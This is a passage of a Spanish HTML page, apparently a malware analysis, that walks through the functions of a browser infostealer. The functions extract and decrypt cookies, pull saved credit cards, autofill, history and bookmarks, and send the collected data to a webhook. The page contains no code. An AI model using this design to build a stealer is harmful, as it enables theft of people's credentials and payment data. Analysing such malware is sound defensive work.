</h3><code><h3>FirefoxCookie</h3></code><h3>.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Consulta SQL</h3></strong><h3>: Realiza una consulta a la base de datos para obtener las cookies.</h3></li><li><strong><h3>Desencriptado</h3></strong><h3>: Utiliza la misma clave maestra para desencriptar los valores de las cookies.</h3></li><li><strong><h3>Almacenamiento</h3></strong><h3>: Añade las cookies extraídas a la lista global.</h3></li></ul></p><p><ol><li>4. <strong><h1>4. getCCs(path, arg):</h1></strong></li></ol></p><p></p><p><h3>Esta función se centra en la extracción de información sobre tarjetas de crédito.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Consulta SQL</h3></strong><h3>: Accede a la base de datos para recuperar detalles de las tarjetas de crédito guardadas.</h3></li><li><strong><h3>Almacenamiento</h3></strong><h3>: Agrega la información de las tarjetas a una lista global.</h3></li></ul></p><p><ol><li>5. <strong><h1>5. getAutofill(path, arg):</h1></strong></li></ol></p><p></p><p><h3>Recoge datos de autocompletado de formularios.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Consulta SQL</h3></strong><h3>: Ejecuta una consulta para obtener datos de autocompletado y almacena los resultados.</h3></li></ul></p><p><ol><li>6. <strong><h1>6. getHistory(path, arg):</h1></strong></li></ol></p><p></p><p><h3>Recupera el historial de navegación.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Consulta SQL</h3></strong><h3>: Recupera URLs del historial del navegador.</h3></li></ul></p><p><ol><li>7. <strong><h1>7. getwebsites(Words):</h1></strong></li></ol></p><p></p><p><h3>Prepara una lista de palabras clave relacionadas con los sitios web en los que se han encontrado credenciales.</h3><h3></h3></p><p><h3></h3></p><p><ol><li>8. <strong><h1>8. getBookmarks(path, arg):</h1></strong></li></ol></p><p></p><p><h3>Extrae los marcadores guardados en el navegador.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Lectura de Archivos JSON</h3></strong><h3>: Accede a la estructura de marcadores y extrae los nombres y URLs.</h3></li></ul></p><p></p><p><strong><h1>9.parseCookies():</h1></strong></p><p></p><p><h3>Convierte las cookies extraídas en un formato más legible y las guarda.</h3></p><p><ol><li>10. <strong><h1>10. startBthread(func, arg):</h1></strong></li></ol></p><p></p><p><h3>Inicia un nuevo hilo para ejecutar funciones de recolección de datos en paralelo.</h3></p><p><ol><li>11. <strong><h1>11. getBrowsers(browserPaths):</h1></strong></li></ol></p><p></p><p><h3>Maneja la recolección de datos de todos los navegadores enumerados.</h3><h3></h3></p><p><h3></h3><ul><li><strong><h3>Ejecuta Funciones concurrentemente</h3></strong><h3>: Llama a las funciones de recolección para cookies, contraseñas, historial, etc., en hilos separados.</h3></li><li><strong><h3>Sube los Resultados</h3></strong><h3>: Envía los datos recolectados al hook al finalizar la recolección.</h3></li></ul></p><p></p></div>
</body>
</html>
